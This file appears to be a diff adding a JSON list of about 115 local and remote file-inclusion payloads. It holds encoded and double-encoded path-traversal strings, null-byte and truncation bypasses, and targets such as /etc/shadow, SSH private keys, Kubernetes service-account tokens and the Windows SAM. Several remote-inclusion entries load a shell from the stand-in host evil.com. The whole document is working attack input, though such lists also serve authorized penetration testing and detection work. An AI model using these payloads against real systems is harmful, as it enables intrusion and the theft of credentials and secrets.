@@ -1,0 +1,1037 @@
+[
+  {
+    "id": "file-inclusion-1",
+    "title": "Methodology",
+    "payload": "../",
+    "context": "Methodology",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-2",
+    "title": "Methodology",
+    "payload": "..\\",
+    "context": "Methodology",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-3",
+    "title": "Methodology",
+    "payload": "..\\/",
+    "context": "Methodology",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-4",
+    "title": "Methodology",
+    "payload": "%2e%2e%2f",
+    "context": "Methodology",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-5",
+    "title": "Methodology",
+    "payload": "%252e%252e%252f",
+    "context": "Methodology",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-6",
+    "title": "Methodology",
+    "payload": "%c0%ae%c0%ae%c0%af",
+    "context": "Methodology",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-7",
+    "title": "Methodology",
+    "payload": "%uff0e%uff0e%u2215",
+    "context": "Methodology",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-8",
+    "title": "Methodology",
+    "payload": "%uff0e%uff0e%u2216",
+    "context": "Methodology",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-9",
+    "title": "URL Encoding",
+    "payload": "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd",
+    "context": "URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-10",
+    "title": "URL Encoding",
+    "payload": "%2e",
+    "context": "URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-11",
+    "title": "URL Encoding",
+    "payload": "%2f",
+    "context": "URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-12",
+    "title": "URL Encoding",
+    "payload": "%5c",
+    "context": "URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-13",
+    "title": "Double URL Encoding",
+    "payload": "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+    "context": "Double URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-14",
+    "title": "Double URL Encoding",
+    "payload": "{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+    "context": "Double URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-15",
+    "title": "Double URL Encoding",
+    "payload": "%252e",
+    "context": "Double URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-16",
+    "title": "Double URL Encoding",
+    "payload": "%252f",
+    "context": "Double URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-17",
+    "title": "Double URL Encoding",
+    "payload": "%255c",
+    "context": "Double URL Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-18",
+    "title": "Unicode Encoding",
+    "payload": "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
+    "context": "Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-19",
+    "title": "Unicode Encoding",
+    "payload": "%u002e",
+    "context": "Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-20",
+    "title": "Unicode Encoding",
+    "payload": "%u2215",
+    "context": "Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-21",
+    "title": "Unicode Encoding",
+    "payload": "%u2216",
+    "context": "Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-22",
+    "title": "Overlong UTF-8 Unicode Encoding",
+    "payload": "%c0%2e",
+    "context": "Overlong UTF-8 Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-23",
+    "title": "Overlong UTF-8 Unicode Encoding",
+    "payload": "%e0%40%ae",
+    "context": "Overlong UTF-8 Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-24",
+    "title": "Overlong UTF-8 Unicode Encoding",
+    "payload": "%c0%ae",
+    "context": "Overlong UTF-8 Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-25",
+    "title": "Overlong UTF-8 Unicode Encoding",
+    "payload": "%c0%af",
+    "context": "Overlong UTF-8 Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-26",
+    "title": "Overlong UTF-8 Unicode Encoding",
+    "payload": "%e0%80%af",
+    "context": "Overlong UTF-8 Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-27",
+    "title": "Overlong UTF-8 Unicode Encoding",
+    "payload": "%c0%2f",
+    "context": "Overlong UTF-8 Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-28",
+    "title": "Overlong UTF-8 Unicode Encoding",
+    "payload": "%c0%5c",
+    "context": "Overlong UTF-8 Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-29",
+    "title": "Overlong UTF-8 Unicode Encoding",
+    "payload": "%c0%80%5c",
+    "context": "Overlong UTF-8 Unicode Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-30",
+    "title": "Mangled Path",
+    "payload": "..././",
+    "context": "Mangled Path",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-31",
+    "title": "Mangled Path",
+    "payload": "...\\.\\",
+    "context": "Mangled Path",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-32",
+    "title": "Mangled Path",
+    "payload": "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini",
+    "context": "Mangled Path",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-33",
+    "title": "NULL Bytes",
+    "payload": "{{BaseURL}}/.%00./.%00./etc/passwd",
+    "context": "NULL Bytes",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-34",
+    "title": "NULL Bytes",
+    "payload": "{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm",
+    "context": "NULL Bytes",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-35",
+    "title": "Reverse Proxy URL Implementation",
+    "payload": "..;/",
+    "context": "Reverse Proxy URL Implementation",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-36",
+    "title": "Reverse Proxy URL Implementation",
+    "payload": "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}",
+    "context": "Reverse Proxy URL Implementation",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-37",
+    "title": "UNC Share",
+    "payload": "\\\\localhost\\c$\\windows\\win.ini",
+    "context": "UNC Share",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-38",
+    "title": "ASP NET Cookieless",
+    "payload": "/(S(X))/",
+    "context": "ASP NET Cookieless",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-39",
+    "title": "ASP NET Cookieless",
+    "payload": "/(Y(Z))/",
+    "context": "ASP NET Cookieless",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-40",
+    "title": "ASP NET Cookieless",
+    "payload": "/(G(AAA-BBB)D(CCC=DDD)E(0-1))/",
+    "context": "ASP NET Cookieless",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-41",
+    "title": "ASP NET Cookieless",
+    "payload": "/(S(X))/admin/(S(X))/main.aspx",
+    "context": "ASP NET Cookieless",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-42",
+    "title": "ASP NET Cookieless",
+    "payload": "/(S(x))/b/(S(x))in/Navigator.dll",
+    "context": "ASP NET Cookieless",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-43",
+    "title": "ASP NET Cookieless",
+    "payload": "/MyApp/(S(X))/",
+    "context": "ASP NET Cookieless",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-44",
+    "title": "ASP NET Cookieless",
+    "payload": "/admin/(S(X))/main.aspx",
+    "context": "ASP NET Cookieless",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-45",
+    "title": "ASP NET Cookieless",
+    "payload": "/admin/Foobar/(S(X))/../(S(X))/main.aspx",
+    "context": "ASP NET Cookieless",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-46",
+    "title": "IIS Short Name",
+    "payload": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'",
+    "context": "IIS Short Name",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-47",
+    "title": "IIS Short Name",
+    "payload": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'",
+    "context": "IIS Short Name",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-48",
+    "title": "IIS Short Name",
+    "payload": "shortscan http://example.org/",
+    "context": "IIS Short Name",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-49",
+    "title": "Java URL Protocol",
+    "payload": "url:file:///etc/passwd",
+    "context": "Java URL Protocol",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-50",
+    "title": "Java URL Protocol",
+    "payload": "url:http://127.0.0.1:8080",
+    "context": "Java URL Protocol",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-51",
+    "title": "Linux Files",
+    "payload": "/etc/issue",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-52",
+    "title": "Linux Files",
+    "payload": "/etc/group",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-53",
+    "title": "Linux Files",
+    "payload": "/etc/hosts",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-54",
+    "title": "Linux Files",
+    "payload": "/etc/motd",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-55",
+    "title": "Linux Files",
+    "payload": "/proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-56",
+    "title": "Linux Files",
+    "payload": "/proc/self/environ",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-57",
+    "title": "Linux Files",
+    "payload": "/proc/version",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-58",
+    "title": "Linux Files",
+    "payload": "/proc/cmdline",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-59",
+    "title": "Linux Files",
+    "payload": "/proc/sched_debug",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-60",
+    "title": "Linux Files",
+    "payload": "/proc/mounts",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-61",
+    "title": "Linux Files",
+    "payload": "/proc/net/arp",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-62",
+    "title": "Linux Files",
+    "payload": "/proc/net/route",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-63",
+    "title": "Linux Files",
+    "payload": "/proc/net/tcp",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-64",
+    "title": "Linux Files",
+    "payload": "/proc/net/udp",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-65",
+    "title": "Linux Files",
+    "payload": "/proc/self/cwd/index.php",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-66",
+    "title": "Linux Files",
+    "payload": "/proc/self/cwd/main.py",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-67",
+    "title": "Linux Files",
+    "payload": "/var/lib/mlocate/mlocate.db",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-68",
+    "title": "Linux Files",
+    "payload": "/var/lib/plocate/plocate.db",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-69",
+    "title": "Linux Files",
+    "payload": "/var/lib/mlocate.db",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-70",
+    "title": "Linux Files",
+    "payload": "/etc/passwd",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-71",
+    "title": "Linux Files",
+    "payload": "/etc/shadow",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-72",
+    "title": "Linux Files",
+    "payload": "/home/$USER/.bash_history",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-73",
+    "title": "Linux Files",
+    "payload": "/home/$USER/.ssh/id_rsa",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-74",
+    "title": "Linux Files",
+    "payload": "/etc/mysql/my.cnf",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-75",
+    "title": "Linux Files",
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/token",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-76",
+    "title": "Linux Files",
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/namespace",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-77",
+    "title": "Linux Files",
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/certificate",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-78",
+    "title": "Linux Files",
+    "payload": "/var/run/secrets/kubernetes.io/serviceaccount",
+    "context": "Linux Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-79",
+    "title": "Windows Files",
+    "payload": "C:\\Windows\\win.ini",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-80",
+    "title": "Windows Files",
+    "payload": "C:\\windows\\system32\\license.rtf",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-81",
+    "title": "Windows Files",
+    "payload": "c:/inetpub/logs/logfiles",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-82",
+    "title": "Windows Files",
+    "payload": "c:/inetpub/wwwroot/global.asa",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-83",
+    "title": "Windows Files",
+    "payload": "c:/inetpub/wwwroot/index.asp",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-84",
+    "title": "Windows Files",
+    "payload": "c:/inetpub/wwwroot/web.config",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-85",
+    "title": "Windows Files",
+    "payload": "c:/sysprep.inf",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-86",
+    "title": "Windows Files",
+    "payload": "c:/sysprep.xml",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-87",
+    "title": "Windows Files",
+    "payload": "c:/sysprep/sysprep.inf",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-88",
+    "title": "Windows Files",
+    "payload": "c:/sysprep/sysprep.xml",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-89",
+    "title": "Windows Files",
+    "payload": "c:/system32/inetsrv/metabase.xml",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-90",
+    "title": "Windows Files",
+    "payload": "c:/system volume information/wpsettings.dat",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-91",
+    "title": "Windows Files",
+    "payload": "c:/unattend.txt",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-92",
+    "title": "Windows Files",
+    "payload": "c:/unattend.xml",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-93",
+    "title": "Windows Files",
+    "payload": "c:/unattended.txt",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-94",
+    "title": "Windows Files",
+    "payload": "c:/unattended.xml",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-95",
+    "title": "Windows Files",
+    "payload": "c:/windows/repair/sam",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-96",
+    "title": "Windows Files",
+    "payload": "c:/windows/repair/system",
+    "context": "Windows Files",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-97",
+    "title": "Local File Inclusion",
+    "payload": "include($file);",
+    "context": "Local File Inclusion",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-98",
+    "title": "Local File Inclusion",
+    "payload": "http://example.com/index.php?page=../../../etc/passwd",
+    "context": "Local File Inclusion",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-99",
+    "title": "Null Byte",
+    "payload": "http://example.com/index.php?page=../../../etc/passwd%00",
+    "context": "Null Byte",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-100",
+    "title": "Null Byte",
+    "payload": "{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00",
+    "context": "Null Byte",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-101",
+    "title": "Double Encoding",
+    "payload": "http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd",
+    "context": "Double Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-102",
+    "title": "Double Encoding",
+    "payload": "http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00",
+    "context": "Double Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-103",
+    "title": "UTF-8 Encoding",
+    "payload": "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+    "context": "UTF-8 Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-104",
+    "title": "UTF-8 Encoding",
+    "payload": "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
+    "context": "UTF-8 Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-105",
+    "title": "Path Truncation",
+    "payload": "http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]",
+    "context": "Path Truncation",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-106",
+    "title": "Path Truncation",
+    "payload": "http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]",
+    "context": "Path Truncation",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-107",
+    "title": "Path Truncation",
+    "payload": "http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]",
+    "context": "Path Truncation",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-108",
+    "title": "Path Truncation",
+    "payload": "http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd",
+    "context": "Path Truncation",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-109",
+    "title": "Filter Bypass",
+    "payload": "http://example.com/index.php?page=....//....//etc/passwd",
+    "context": "Filter Bypass",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-110",
+    "title": "Filter Bypass",
+    "payload": "http://example.com/index.php?page=..///////..////..//////etc/passwd",
+    "context": "Filter Bypass",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-111",
+    "title": "Filter Bypass",
+    "payload": "http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
+    "context": "Filter Bypass",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-112",
+    "title": "Remote File Inclusion",
+    "payload": "allow_url_include = On",
+    "context": "Remote File Inclusion",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-113",
+    "title": "Remote File Inclusion",
+    "payload": "http://example.com/index.php?page=http://evil.com/shell.txt",
+    "context": "Remote File Inclusion",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-114",
+    "title": "Null Byte",
+    "payload": "http://example.com/index.php?page=http://evil.com/shell.txt%00",
+    "context": "Null Byte",
+    "tags": [
+      "file-inclusion"
+    ]
+  },
+  {
+    "id": "file-inclusion-115",
+    "title": "Double Encoding",
+    "payload": "http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt",
+    "context": "Double Encoding",
+    "tags": [
+      "file-inclusion"
+    ]
+  }
+]
